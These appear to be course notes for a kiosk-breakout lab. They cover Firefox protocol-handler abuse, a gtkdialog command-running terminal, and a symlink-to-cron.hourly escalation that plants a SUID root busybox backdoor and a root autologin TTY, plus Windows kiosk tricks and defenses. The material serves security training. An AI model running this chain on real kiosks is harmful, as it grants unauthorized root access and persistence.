Objective

Escape a locked-down Porteus Kiosk (and by extension thin clients / Windows kiosks) using only on-box functionality: living-off-the-land enumeration, a Firefox profile-manager breakout, gtkdialog pseudo-terminal construction, and a symlink-based privilege escalation to root.

Target surface

  • Porteus Kiosk VM accessed via VNC (xtigervncviewer; connect with password [REDACTED], press * → Full screen so all keystrokes reach the kiosk).
  • Kiosk runs as user guest; Firefox is the only exposed app, right-click disabled, most shortcuts and about: keywords blocked. Home page: file:///var/www/localhost/index.html.

Techniques

1. Kiosk enumeration (living off the land)

  • Inventory the interface: try right-click, middle-click+B/C combos, Alt+Tab / Ctrl+Alt+arrow, window-manager shortcuts (Gnome/KDE lists) — most fail, but never skip the pass; kiosks are rarely airtight.
  • Reference projects for abusing stock binaries: LOLBAS (Windows), GTFOBins (Linux).
  • Browser enumeration: history (back-button long-press), URL-bar suggestions, gear icon (→ about:preferences, blank), about: keywords — all restricted here. The home page is file://-served, so strip index.html for a directory listing (nothing juicy, but test it on every kiosk).
  • First crack: URI schemes. chrome://, ftp://, mailto:, smb:// are blocked, but irc:// pops Firefox's "Launch Application" dialog — an external program launcher. Do not tick "Remember my choice…" (it would lock you out of picking new handlers).

2. Command execution via the protocol handler

  • Firefox passes the URI as argv[1]: launching dunstify shows it ran dunstify irc://myhost. That's why /bin/bash irc://myhost fails (invalid argument) and there are no terminal emulators installed anyway.
  • /usr/bin/env irc://myhost=something /bin/bash cancels the bogus first parameter but still needs a terminal to be visible — dead end without one.
  • Pivot to a program that both accepts a URI argument and has useful flags: Firefox itself. Enter irc://myhost -P "haxor" and pick /usr/bin/firefox → the Firefox profile manager opens; create the "haxor" profile → a full, unrestricted Firefox with menus. Breakout achieved.
  • Read-only recon from the unlocked browser via file:///:
  • /etc/passwd: login shells reveal root, operator, guest as valid users (root/operator share a home — operator looks like a remote-management utility account).
  • /proc/version: recent kernel; direct kernel exploitation unlikely.
  • ~guest/.ssh: no private keys (and no SSH client to use them anyway).

3. gtkdialog — a homemade terminal

  • No terminal, no file browser, no build tools — but Firefox's Scratchpad (Dev tools menu) can save/load arbitrary text files, including a test mytest.txt into the home dir (write primitive).
  • gtkdialog builds GUIs from XML markup; irc://myhost -f /home/guest/mywindow runs a saved dialog. Gotcha: the kiosk converts < to > as you type — copy a < from the splash page HTML and paste it.
  • Test dialog (button <action> runs a shell command): xml <window><vbox><frame Description><text><label>This is an example window.</label></text></frame> <hbox><button ok><action>echo "testing gtk" > /tmp/gtkoutput.txt</action></button> <button cancel></button></hbox></vbox></window> Save with the file-type pulldown set to "All Files", then browse file:///tmp/gtkoutput.txt to confirm execution.
  • Pseudo-terminal: combine an edit element bound to /tmp/termout.txt (input-file + <variable>CMDOUTPUT</variable>), an entry bound to <variable>CMDTORUN</variable>, and a button whose actions are <action>$CMDTORUN > /tmp/termout.txt</action> + <action>refresh:CMDOUTPUT</action>: xml <window><vbox> <vbox scrollable="true" width="500" height="400"> <edit><variable>CMDOUTPUT</variable><input file>/tmp/termout.txt</input></edit> </vbox> <hbox> <text><label>Command:</label></text> <entry><variable>CMDTORUN</variable></entry> <button><label>Run!</label> <action>$CMDTORUN > /tmp/termout.txt</action> <action>refresh:CMDOUTPUT</action></button> </hbox> </vbox></window> (gtkdialog's native terminal/VteTerminal element fails here — the build lacks libvte.)
  • Quirk: Scratchpad often resets edited files to mode 600 — re-chmod after saving.

4. Privilege escalation — openbox + bookmarks.html symlink

  • Enumerate: SUID sweep (find / -perm -u=s -exec ls -al {} +) — only /usr/sbin/mtr and /usr/bin/xlock are recent-ish and neither is exploitable as-is.
  • ps aux reveals root-owned openbox (the X window manager). openbox --replace (run as guest!) restarts the whole X session — and the kiosk refresh scripts rebuild the Firefox profile, including /home/guest/.mozilla/firefox/c3pp43bg.default/bookmarks.html, with raised privileges.
  • Prove the write primitive: back up the profile dir, replace it with a symlink — ln -s /usr/bin /home/guest/.mozilla/firefox/c3pp43bg.default — run openbox --replace; bookmarks.html appears in /usr/bin, owned by guest. You can chmod it afterwards, but cannot rename it (parent dir perms) — the filename is fixed.
  • Persist the write: Scratchpad a helper script that rewrites the bookmarks file with redirects (nested redirects would be eaten by the gtkdialog terminal's own redirect): bash echo "#!/bin/bash" > /usr/bin/bookmarks.html echo "gtkdialog -f /home/guest/terminal.txt" >> /usr/bin/bookmarks.html
  • Escalation path: /etc/profile.d (needs .sh extension) and /etc/cron.d (needs root ownership) are blocked, but /etc/cron.hourly|daily|weekly|monthly accept non-root-owned files. Aim the symlink at /etc/cron.hourly and write a SUID backdoor instead of a fragile terminal: bash echo "#!/bin/bash" > /etc/cron.hourly/bookmarks.html echo "chown root:root /home/guest/busybox" >> /etc/cron.hourly/bookmarks.html echo "chmod +s /home/guest/busybox" >> /etc/cron.hourly/bookmarks.html (Copy /bin/busybox to /home/guest/busybox first.) At the top of the next hour: /home/guest/busybox sh /home/guest/runterminal.sh where runterminal.sh is #!/bin/bash + /usr/bin/gtkdialog -f /home/guest/terminal.txt → root terminal.

5. Root TTY via VNC

  • xdotool key Ctrl+Alt+F3 shows VT switching is dead: DontVTSwitch is uncommented in /etc/X11/xorg.conf.d/10-xorg.conf. As root: copy the file out, chmod 777, comment out DontVTSwitch in Scratchpad, copy back, chmod 644.
  • Define a TTY in /etc/inittab (same copy/chmod/Scratchpad/copy-back dance, restore 600): c3::respawn:/sbin/agetty --noclear --autologin root 38400 tty3 linux Reload without rebooting: /sbin/init q.
  • VNC still shows the GUI, so kill and retarget it (getmeatty.sh): killall x11vnc + x11vnc -rawfb vt3. Reconnect → a text console auto-logged in as root. Full root terminal, no reboot, no kiosk self-heal triggered.

6. Windows kiosk breakout techniques (transferable)

  • Environment variables bypass path filters: %APPDATA%, %ALLUSERSPROFILE%, %COMSPEC%, %HOMEDRIVE%/%HOMEPATH%, %PROGRAMFILES%, %SystemRoot%/%WINDIR%, %TEMP%/%TMP%, %USERPROFILE%.
  • UNC paths: blocked from C:\Windows\System32? Try \\127.0.0.1\C$\Windows\System32\.
  • shell: shortcuts in file dialogs: shell:System, shell:Common Start Menu, shell:Downloads, shell:MyComputerFolder.
  • Embedded links in help/search dialogs (search for Notepad/cmd.exe/PowerShell) often launch apps; try click + function-key combos on them.
  • Right-click → Create shortcut in a file dialog, then retarget the shortcut at cmd.exe/powershell.exe. Drag-and-drop a file onto cmd/PowerShell opens a command window. The print dialog is a classic route to a full file browser (works on Linux kiosks too).
  • Shortcuts worth trying: Ctrl+Alt+Del (lock screen → Task Manager), Ctrl+Alt+Del variants, Alt+F4? — the course lists: Ctrl+P (print dialog), Alt+Tab (task switcher), Win+R (Run menu), Ctrl+Esc (Start Menu), F1 (Help).
  • Whitelist/blacklist bypass: hash/filename/path-based controls fall to copy+rename; if you can write to a whitelisted path, overwrite the binary instead.

Detection & defense

  • Kiosks that are "a restrictive veneer over a stock OS" inherit every dialog, handler, and shortcut; enumerate and disable: protocol-handler launch prompts, Scratchpad/DevTools, profile manager, and every file:///URI scheme that triggers external handlers.
  • Privilege boundary is the real fix: the kiosk refresh scripts must not write guest-owned files with elevated privileges, and openbox must not accept --replace from the kiosk user's session. Cron directories accepting non-root-owned executables widen this hole.
  • Self-healing on reboot doesn't help if an attacker never reboots (openbox --replace preserves state) — monitor for X-session restarts and unexpected symlinks in user profile paths.
  • On Windows kiosks: strip env-var/UNC/shell: shortcuts from input validation, block right-click and shortcut creation in file dialogs, and expect the print dialog to be abused.

Exercises & extra miles (as given in the module)

  • Enumerate everything reachable through the Launch Application dialog; identify which binaries are useful for recon or exploitation when launched with irc://myhost as argv[1].
  • Build a better gtkdialog terminal (integrate stderr; explore other widgets); Extra Mile: a Scratchpad-free way to write user text to disk (JavaScript console), and a gtkdialog text editor.
  • Exercise: determine why the bookmarks.html trick needs a symlinked directory rather than a symlinked file.
  • Windows kiosk: mine the Notepad help dialog for direct application-launch links.
